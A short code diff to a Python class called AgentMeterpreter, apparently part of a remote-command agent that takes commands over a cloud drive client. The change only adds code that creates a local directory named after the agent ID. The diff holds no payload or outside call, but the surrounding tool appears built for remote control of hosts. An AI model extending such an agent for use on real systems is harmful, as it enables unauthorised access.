@@ -3,6 +3,7 @@ Agent Meterpreter
 """
 
 
+import os
 from drive.drive_client import DriveClient
 from command.command_factory import CommandFactory
 from command.command_runner import CommandRunner
@@ -22,6 +23,8 @@ class AgentMeterpreter:
         return self._agent_id
 
     def init(self, drive_client: DriveClient, agent_id: str):
+        if not os.path.exists(agent_id):
+            os.mkdir(agent_id)
         self._command_runner.init(drive_client, "/" + agent_id)
 
     def cleanup(self):
